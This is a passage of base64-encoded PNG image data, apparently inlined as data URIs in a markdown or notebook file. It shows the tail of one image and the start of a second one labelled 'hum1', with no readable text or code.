o9Zz1Dx3e7tIWXfuK87ujpMtxuLMfY0o25yzoS8fns+hKsYiWz0qR63nqHnudneR+77TOSNbjMWZ+xpRtjlnQ18+PJ9DVYxFtnpUjlrPUfPcvd9FAAAAfLCLAACASOwiAAAgErsIAACIxC4CAAAisYsAAIBI7CIAACASuwgAAIjELgIAACKxiwAAgEjsIgAAIBK7CAAAiLS7i9Qf4EvzO4eFqh76GovnfEacIfd9LNn6Ys4+VPV49mU5S1jP+11kmub6+3vXbclxL1X10NdYPOcz4gy572PJ1hdz9qGqx7Mvy1naerq7yLa062iqeuhrLJ7zGXGG3PexZOuLOftQ1ePZl+UsbT2/d5Fpvr1u2dr7lnJxWef293JeOfD7u9gzVT30NRbP+ajO8jRizRb05YM5+1DV49mX5azv1fO0i9yS1WyXmq4sPOWflv96KRf3s92o6qGvsXjOR3WWpxFrtqAvH8zZh6oez74sZ32vnjef0czzsm7rsq5btS5z3XoCqeqhr7F4zmfEGXLfx5KtL+bsQ1WPZ1+Ws+T17O0iD0nu5cNf3ssH+srOcz4jzpD7PpZsfTFnH6p6PPuynCWv5+dnNPVFS/0AaJqW7XvvgixU9dDXWDznM+IMue9jydYXc/ahqsezL8tZ36vn+bur9Suxl7rg1Fwv30mpB98Cnajqoa+xeM5nxBly38eSrS/m7ENVj2dflrO+V8+bz2iKdiD/J+rLjtqXiud8Rpwh930s2fpizj5U9Xj2ZTlLW8/eLlLWnbYGtT+FUtVDX2PxnM+IM+S+jyVbX8zZh6oez74sZ2nr2d1F7vtOnnspqYe+xuI5nxFnyH0fS7a+mLMPVT2efVnO0tbzfhcBAADwwS4CAAAisYsAAIBI7CIAACASuwgAAIjELgIAACKxiwAAgEjsIgAAIBK7CAAAiMQuAgAAIrGLAACASOwiAAAg0u4uUn+AL83vHBaqes7cV7YYC1UeFc++ssV4ylaPCnP2oXrmPWMsVHlUhPW830Wmaa6/v3fdlhw9q+o5c1/ZYixUeVQ8+8oW4ylbPSrM2YfqmfeMsVDlUdHW091FtqVdR1PVc+a+ssVYqPKoePaVLcZTtnpUmLMP1TPvGWOhyqOiref3LjLNt9ctW3vfUi4u69z+Xs4rB/ruYqp6ztxXtphy+ZEqj4pnX9liyqWbbPWoMGcflr6yxZTLj1R5VL5Xz9MucktWs11qurLwlH9a/uulXNzPdqOq58x9ZYtppXep8qh49pUtppXuIls9KszZh6WvbDGt9C5VHpXv1fPmM5p5XtZtXdZ1q9ZlrltPIFU9Z+4rW4yFKo+KZ1/ZYjxlq0eFOftQPfOeMRaqPCryevZ2kYckPT/85b18OFdf2WIsVHlUPPvKFuMpWz0qzNmH6pn3jLFQ5VGR1/PzM5r6oqV+ADRNy5bhXdDf13PmvrLFtNK7VHlUPPvKFtNKd5GtHhXm7EP1zHvGtNK7VHlUvlfP83dX61diL3XBqblevpNSD74FOlHVc+a+ssWUy49UeVQ8+8oWUy7dZKtHhTn7UD3znjHl8iNVHpXv1fPmM5qiDfJw/3fozH1li7FQ5VHx7CtbjKds9agwZx+qZ94zxkKVR0Vbz94uUtad+4rjunPtUdVz5r6yxVio8qh49pUtxlO2elSYsw/VM+8ZY6HKo6KtZ3cXue87eXqW1HPmvrLFWKjyqHj2lS3GU7Z6VJizD9Uz7xljocqjoq3n/S4CAADgg10EAABEYhcBAACR2EUAAEAkdhEAABCJXQQAAERiFwEAAJHYRQAAQCR2EQAAEIldBAAARGIXAQAAkdhFAABAJHYRAAAQiV0EAABEYhcBAACR2EUAAEAkdhEAABCJXQQAAERiFwEAAJHYRQAAQCR2EQAAEIldBAAARGIXAQAAkdhFAABAJHYRAAAQiV0EAABEYhcBAACR2EUAAEAkdhEAABDn16//APD3UT5gJOAwAAAAAElFTkSuQmCC

[hum1]:data:image/png;base64,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